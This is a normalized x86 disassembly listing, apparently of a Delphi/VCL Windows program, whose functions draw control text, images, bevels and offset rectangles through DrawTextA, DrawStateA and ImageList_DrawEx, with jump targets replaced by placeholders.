test [ eax + 0x208 ] 0x1
je r-xdata
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42517c
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x31 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x31 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42517c
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov edx [ ebp - 0x31 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_424990
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
je r-xdata
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov ecx [ ebp - 0x2d ]
call sub_42517c
mov ecx [ ebp - 0x25 ]
dec ecx
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jb r-xdata
mov ecx [ ebp - 0x25 ]
dec ecx
mov edx [ ebp - 0x29 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42517c
mov ecx [ ebp - 0x25 ]
dec ecx
mov edx [ ebp - 0x31 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_424990
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x208 ] 0x8
je r-xdata
mov ecx [ ebp - 0x2d ]
inc ecx
mov edx [ ebp - 0x29 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42517c
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov edx [ ebp - 0x29 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42511c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x8 ]
call sub_4255f0
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x20a ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov edx [ ebp - 0x29 ]
sub edx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_42517c
mov ecx [ ebp - 0x25 ]
sub ecx 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x31 ]
call sub_42511c
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x209 ]
dec eax
sub al 0x2
jae r-xdata
sub_48254c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x220 ]
mov esi eax
mov edx [ eax + 0x40 ]
mov eax ebx
call sub_44ca14
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_481dd0
mov esi [ ebx + 0x274 ]
sub_482578
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44e608
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov [ esp ] 0xb411
xor eax eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
mov edx esp
mov eax ebx
call sub_44fe08
sub_4825bc
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi ]
sub eax 0xb014
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579d8
test al al
je r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov bl 0x1
sub_482618
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454300
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x16
mov eax esi
call sub_44c02c
mov edx 0x16
mov eax esi
call sub_44c008
mov [ esi + 0x171 ] 0x0
mov dl 0x1
mov eax esi
call sub_44c9e8
push 0x4
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x4
mov edx 0x4
mov eax 0x4
call sub_417298
push esi
lea edi [ esi + 0x17a ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x1a0 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4826c0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45435c
test bl bl
jle r-xdata
cmp esi [ eax + 0x40 ]
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
xor edx edx
mov [ eax + 0x40 ] edx
sub_4826fc
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax + 0x8 ]
xor edx edx
mov eax ebx
call sub_44cf6c
pop ebx
retn
sub_482720
push ebx
mov ebx eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
call sub_483f8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
mov eax [ ebx + 0x198 ]
sub eax [ ebx + 0x190 ]
pop ebx
retn
mov eax [ ebx + 0x16c ]
call sub_47eb58
cmp [ eax + 0x28 ] 0x2
jne r-xdata
xor eax eax
pop ebx
retn
sub_482768
push ebx
mov ebx eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
call sub_483f8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
mov eax [ ebx + 0x19c ]
sub eax [ ebx + 0x194 ]
pop ebx
retn
mov eax [ ebx + 0x16c ]
call sub_47eb58
cmp [ eax + 0x28 ] 0x2
jne r-xdata
xor eax eax
pop ebx
retn
sub_4827b0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_482720
test eax eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x18c ]
sub_4827e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_484100
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov al [ ebx + 0x171 ]
mov edx eax
sub dl 0x2
jb r-xdata
test al al
jne r-xdata
sub dl 0x2
jb r-xdata
mov edx edi
sar edx 0x1
jns r-xdata
mov edx edi
sar edx 0x1
jns r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x4 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov eax [ esp + 0x4 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebx + 0x17e ]
push eax
mov eax ebx
call sub_482720
sar eax 0x1
jns r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
sub edx eax
lea ecx [ esp + 0x8 ]
mov eax esi
sub eax [ ebx + 0x182 ]
sub eax [ esp ]
call sub_41725c
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
mov eax ebx
call sub_482768
sar eax 0x1
jns r-xdata
adc eax 0x0
sub edx eax
lea ecx [ esp + 0x8 ]
mov eax [ ebx + 0x17a ]
call sub_41725c
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
mov eax ebx
call sub_482768
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edi esi
sar edi 0x1
jns r-xdata
adc eax 0x0
mov edx edi
sar edx 0x1
jns r-xdata
mov eax esi
sar eax 0x1
jns r-xdata
sar edi 0x1
jns r-xdata
adc eax 0x0
sar edi 0x1
jns r-xdata
adc eax 0x0
mov edx edi
sub edx eax
push edx
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
mov edx esp
mov eax ebx
call sub_4827b0
mov ebp eax
mov eax ebx
call sub_482768
add eax [ ebx + 0x194 ]
add ebp eax
mov edx ebp
mov eax edi
mov ecx [ esp ]
sar ecx 0x1
jns r-xdata
adc edi 0x0
mov eax [ esp + 0x4 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov edx [ esp ]
sar edx 0x1
jns r-xdata
adc eax 0x0
sub edi eax
push edi
mov eax [ ebx + 0x17a ]
push eax
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
jmp r-xdata
adc edi 0x0
sub edi eax
push edi
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4827b0
mov edx [ ebx + 0x17a ]
add edx [ esp + 0x4 ]
add eax edx
push eax
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
jmp r-xdata
adc edi 0x0
sub eax ecx
lea ecx [ esp + 0x8 ]
call sub_41725c
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
adc ecx 0x0
sub edx eax
mov eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
sub eax edx
lea ecx [ esp + 0x8 ]
mov edx [ ebx + 0x17e ]
call sub_41725c
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
jmp r-xdata
adc edx 0x0
mov ecx [ esp ]
sar ecx 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x176 ]
add eax [ esp + 0x4 ]
add eax [ ebx + 0x18c ]
push eax
mov eax ebx
call sub_482720
sar eax 0x1
jns r-xdata
sub eax ecx
lea ecx [ esp + 0x8 ]
call sub_41725c
mov eax [ esp + 0x8 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x176 ] eax
adc ecx 0x0
sar esi 0x1
jns r-xdata
adc eax 0x0
sub esi eax
push esi
lea eax [ ebx + 0x190 ]
push eax
call OffsetRect
jmp r-xdata
adc esi 0x0
sub_482a94
push ebx
mov ebx eax
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
pop ebx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
call sub_483bd4
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x38 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_482ae8
push ebx
push esi
mov ebx eax
xor eax eax
mov ecx [ edx ]
cmp ecx 0x204
jge r-xdata
add ecx 0xfffffdfc
sub ecx 0x2
jb r-xdata
sub ecx 0x7b
je r-xdata
mov edx [ ebx + 0x16c ]
test edx edx
je r-xdata
add ecx 0xffff51f3
sub ecx 0x2
jb r-xdata
add ecx 0xfffffe7b
sub ecx 0x3
jb r-xdata
pop esi
pop ebx
retn
cmp [ edx + 0x1c ] 0x0
je r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov al 0x1
pop esi
pop ebx
retn
sub ecx 0x1a
je r-xdata
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
jmp r-xdata
mov al 0x1
mov eax esi
call sub_47eb64
test eax eax
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb64
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_482b7c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4840c8
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_4250a4
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax ebx
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d750
test al al
je r-xdata
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov eax ebx
call sub_4840c8
mov eax [ eax + 0x210 ]
call sub_47d750
test al al
je r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov edi eax
mov eax ebx
call sub_4840c8
call sub_48254c
cmp edi [ eax + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4840c8
mov eax [ eax + 0x210 ]
mov al [ eax + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esp
mov eax ebx
call sub_44c214
push 0x0
push 0x0
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
mov eax ebx
call sub_4840c8
call sub_4530b8
push eax
call sub_43d448
pop edx
pop ecx
call sub_43d6c0
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
xor edx edx
call sub_424660
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_482c8c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_483f8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47d74c
call sub_47cb00
mov esi [ eax + 0x38 ]
mov eax [ ebx + 0x16c ]
call sub_47eb64
mov eax [ eax + 0x5c ]
mov esi [ eax + 0x38 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x58 ] 0xffffffff
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx [ edi + 0x4 ]
push edx
mov edx [ ebx + 0x16c ]
mov edx [ edx + 0x58 ]
push edx
push 0x3
push 0x0
push eax
mov ecx [ edi ]
mov edx [ ebx + 0x160 ]
mov eax esi
call sub_45aa7c
sub_482d1c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_483f8c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47d74c
call sub_47cb00
mov esi [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx 0x20
mov eax 0x20
call sub_41725c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_483049
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48302c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_429e14
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424c70
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_429e14
lea edx [ ebp - 0x28 ]
call sub_42554c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
pop edx
call sub_4250a4
mov eax [ ebp - 0x10 ]
call sub_429e14
lea edx [ ebp - 0x28 ]
call sub_42554c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417298
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
mov ecx [ ebx + 0x160 ]
pop edx
call sub_424f70
jmp r-xdata
mov eax [ ebx + 0x16c ]
call sub_47d690
call sub_47d750
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_429e14
call sub_425570
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x80 ]
push eax
mov eax esi
call sub_45a1b4
push eax
call ImageList_DrawEx
mov esi [ ebp - 0x18 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edi [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push edi
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
xor edx edx
xor eax eax
call sub_417298
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0xc ]
call sub_429e14
mov ecx [ ebp - 0x10 ]
pop edx
call sub_425274
mov edx 0xffffff
mov eax [ ebp - 0xc ]
call sub_42af8c
mov dl 0x1
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx edi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
mov eax [ eax + 0x14 ]
pop edx
call sub_424c70
mov eax [ ebp - 0x10 ]
call sub_429e14
lea edx [ ebp - 0x28 ]
call sub_42554c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
pop edx
call sub_4250a4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429e14
xor ecx ecx
xor edx edx
call sub_424ff8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov edi [ ebp - 0x4 ]
mov eax edi
add eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebp - 0x8 ]
mov ecx esi
add ecx [ ebp - 0x18 ]
mov edx edi
mov eax esi
call sub_417298
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
mov ecx [ ebp - 0x10 ]
call sub_425274
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax edi
add eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebp - 0x8 ]
mov ecx esi
add ecx [ ebp - 0x18 ]
mov edx edi
mov eax esi
call sub_417298
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
mov ecx [ ebp - 0xc ]
call sub_425274
jmp r-xdata
push 0x24
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424ca4
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawStateA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483033
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_483058
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4840c8
test eax eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4840c8
mov al [ eax + 0x227 ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_44c2bc
mov edx eax
sar edx 0x1
jns r-xdata
mov eax ebx
call sub_44c278
sar eax 0x1
jns r-xdata
mov ecx esp
mov eax esi
call sub_41725c
mov eax ebx
call sub_44c2bc
mov edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov ecx esp
mov edx esi
dec edx
call sub_41725c
mov eax ebx
call sub_44c2bc
sub eax esi
inc eax
push eax
mov eax ebx
call sub_44c278
sar eax 0x1
jns r-xdata
adc eax 0x0
lea ecx [ esp + 0x8 ]
mov eax [ ebx + 0x48 ]
sub eax esi
call sub_41725c
adc edx 0x0
lea ecx [ esp + 0xc ]
pop edx
call sub_41725c
jmp r-xdata
adc eax 0x0
mov edi [ ebx + 0x16c ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov esi [ ebx + 0x160 ]
mov edx 0x1
mov eax [ esi + 0x10 ]
call sub_424a9c
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov edi [ ebx + 0x70 ]
cmp edi 0xff00000f
jne r-xdata
mov eax edi
call sub_47f37c
test al al
je r-xdata
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax esi
call sub_4250a4
mov edx 0xffffffce
mov eax edi
call sub_46ec74
mov edx eax
mov eax [ esi + 0x10 ]
call sub_424990
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_424990
jmp r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov eax [ eax + 0x6c ]
mov edx 0xffffffce
call sub_46ec74
mov edx eax
mov eax [ esi + 0x10 ]
call sub_424990
jmp r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax edi
call sub_47f37c
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax esi
call sub_42517c
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_42511c
mov edi [ ebx + 0x16c ]
test edi edi
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x6c ]
mov eax [ esi + 0x10 ]
call sub_424990
mov edx 0xff000014
mov eax [ esi + 0x10 ]
call sub_424990
jmp r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov ecx [ esp + 0x4 ]
inc ecx
mov edx eax
mov eax esi
call sub_42517c
mov ecx [ esp + 0xc ]
inc ecx
mov edx ebx
mov eax esi
call sub_42511c
mov ebx eax
inc ebx
mov edx ebx
mov ecx [ esp + 0x4 ]
mov eax esi
call sub_42517c
mov edx ebx
mov ecx [ esp + 0xc ]
mov eax esi
call sub_42511c
jmp r-xdata
mov ebx [ esp + 0x8 ]
mov eax [ esp ]
cmp ebx eax
jne r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov eax [ eax + 0x6c ]
mov edx 0x13
call sub_46ebb4
mov edx eax
mov eax [ esi + 0x10 ]
call sub_424990
jmp r-xdata
mov edx 0xff000014
mov eax [ esi + 0x10 ]
call sub_424990
jmp r-xdata
sub_483284
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_4044e8
xor eax eax
push ebp
push sub_4832e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
push eax
push esi
mov eax [ ebp + 0x8 ]
call sub_4042f8
push eax
mov eax [ ebp + 0x8 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4832ea
lea eax [ ebp + 0x8 ]
call sub_404038
retn
sub_4832f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov eax [ ebp + 0x10 ]
call sub_4044e8
xor eax eax
push ebp
push sub_4833bc
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_4244a4
push esi
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
call sub_4042f8
push eax
mov eax [ ebp + 0x10 ]
call sub_4044f8
mov edi eax
push edi
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0xc ]
call sub_4244a4
push esi
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
call sub_4042f8
push eax
push edi
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4833c3
lea eax [ ebp + 0x10 ]
call sub_404038
retn
sub_4833cc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
mov al 0x1
pop ebx
retn
sub_4833fc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_48379b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x1a0 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x1a0 ]
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424d8c
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424d8c
mov al 0x1
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
cmp [ eax + 0x24 ] 0x20000000
je r-xdata
